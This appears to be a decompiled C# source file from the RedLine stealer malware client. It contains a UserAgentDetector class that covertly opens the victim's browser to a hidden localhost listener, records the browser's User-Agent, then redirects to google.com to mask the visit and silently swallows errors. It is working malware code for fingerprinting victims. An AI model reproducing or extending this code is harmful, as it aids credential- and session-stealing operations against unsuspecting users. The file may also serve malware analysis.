using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace RedLine.Client.Logic.Others
{
  public static class UserAgentDetector
  {
    private static int port = new Random().Next(13000, 14000);
    private static string useragent;

    public static string GetUserAgent()
    {
      try
      {
        UserAgentDetector.StartServer(UserAgentDetector.port);
        Process.Start(string.Format("http://localhost:{0}", (object) UserAgentDetector.port));
        long ticks = DateTime.Now.Ticks;
        while (UserAgentDetector.useragent == null)
        {
          if (new TimeSpan(DateTime.Now.Ticks - ticks).TotalSeconds < 60.0)
            Thread.Sleep(100);
          else
            break;
        }
      }
      catch
      {
      }
      return UserAgentDetector.useragent;
    }

    private static void StartServer(int port)
    {
      string[] strArray = new string[1]
      {
        string.Format("http://localhost:{0}/", (object) port)
      };
      HttpListener httpListener = new HttpListener();
      foreach (string uriPrefix in strArray)
        httpListener.Prefixes.Add(uriPrefix);
      httpListener.Start();
      new Thread(new ParameterizedThreadStart(UserAgentDetector.Listen)).Start((object) httpListener);
    }

    private static void Listen(object listenerObj)
    {
      HttpListener httpListener = listenerObj as HttpListener;
      HttpListenerContext context = httpListener.GetContext();
      UserAgentDetector.useragent = context.Request.Headers["User-Agent"];
      HttpListenerResponse response = context.Response;
      response.Redirect("https://google.com/");
      response.Close();
      httpListener.Stop();
    }
  }
}
